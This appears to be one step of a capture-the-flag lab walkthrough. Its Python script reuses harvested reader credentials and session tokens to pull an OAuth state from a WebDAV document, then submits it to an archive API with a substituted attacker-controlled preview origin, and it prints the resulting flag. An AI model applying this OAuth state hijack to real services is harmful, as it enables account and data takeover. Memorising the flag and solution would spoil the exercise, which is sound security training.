The OAuth state is retained in the planning OAuth context document
`OAUTH-PLN-882.json`, shared read-only with the planner reader account. Read the
state from that document with the planning-reader credentials from W04.3, then
submit the drawing context to the archive service.

```python
import json, ssl, base64, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
# documents.arwc.test (Nextcloud) presents the ARWC native (edge) certificate, so
# verify the WebDAV read with the CA bundle, not the corporate CA.
docs_ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
planning = pathlib.Path("receipts/planner-handover").read_text().strip()
access = json.loads(pathlib.Path("receipts/planning-access.json").read_text())

# Read oauth_state from the planning OAuth context document (OAUTH-PLN-882.json),
# shared read-only with the planner reader. This document is the authoritative
# source for the OAuth state.
reader = access["username"]
auth = "Basic " + base64.b64encode(f'{reader}:{access["password"]}'.encode()).decode()
oauth_file = access["oauth_context_path"].rsplit("/", 1)[-1]
url = f"https://documents.arwc.test/remote.php/dav/files/{reader}/{oauth_file}"
doc = json.loads(urllib.request.urlopen(
    urllib.request.Request(url, headers={"Authorization": auth}), context=docs_ctx).read())
oauth_state = doc["oauth_state"]

# Submit the drawing context with the recovered OAuth state and the controlled
# preview origin that replaces the pending one.
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc",
     "X-ARWC-Planning-Access": planning, "Content-Type": "application/json"}
body = json.dumps({
    "drawing": "DRW-OG2-R8",
    "review": "REV-CRR-4417",
    "oauth_state": oauth_state,
    "preview_origin": "https://preview-cinder.arwc.test",
}).encode()
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://retained-archive.arwc.test/api/drawing-contexts",
                            data=body, headers=h, method="POST"), context=ctx).read())
print("record_id:", d["record"]["record_id"])   # RENDER-CRR-882
print("flag:", d["flag"])                        # FLAG{ae7bb9411e4f18dc}
```

Flag: `FLAG{ae7bb9411e4f18dc}` in the top-level `flag` field.
